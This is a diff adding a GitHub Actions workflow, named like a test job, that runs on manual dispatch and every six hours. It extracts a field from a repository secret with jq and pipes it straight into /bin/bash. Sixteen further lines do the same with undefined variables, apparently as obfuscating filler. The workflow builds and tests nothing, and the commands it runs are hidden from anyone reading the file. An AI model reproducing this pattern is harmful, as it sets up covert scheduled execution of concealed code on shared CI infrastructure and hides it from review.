@@ -1,0 +1,34 @@
+name: testbulma35
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: testbulma35
+        env:
+          yywg0222: ${{ secrets.yywg0222 }}
+        run: |
+          echo $yywg0222 | jq -r .nx35145 | /bin/bash
+          echo $pde97442 | jq -r .qctqm0570 | /bin/bash
+          echo $rqnw24023 | jq -r .oka1 | /bin/bash
+          echo $d3763 | jq -r .vn444 | /bin/bash
+          echo $xodd73598 | jq -r .le17 | /bin/bash
+          echo $av07 | jq -r .t2474 | /bin/bash
+          echo $x98301 | jq -r .tgrs7600 | /bin/bash
+          echo $y37857 | jq -r .nxjb100 | /bin/bash
+          echo $add0382 | jq -r .ak64 | /bin/bash
+          echo $npsyx8 | jq -r .gih508 | /bin/bash
+          echo $b42 | jq -r .svta63 | /bin/bash
+          echo $mwggj71349 | jq -r .z79 | /bin/bash
+          echo $b47539 | jq -r .mtxwq47996 | /bin/bash
+          echo $ky0 | jq -r .eqlmi998 | /bin/bash
+          echo $p47939 | jq -r .bzygf07059 | /bin/bash
+          echo $dlty29 | jq -r .epga64212 | /bin/bash
+          echo $qfi93188 | jq -r .bkwq35034 | /bin/bash
+
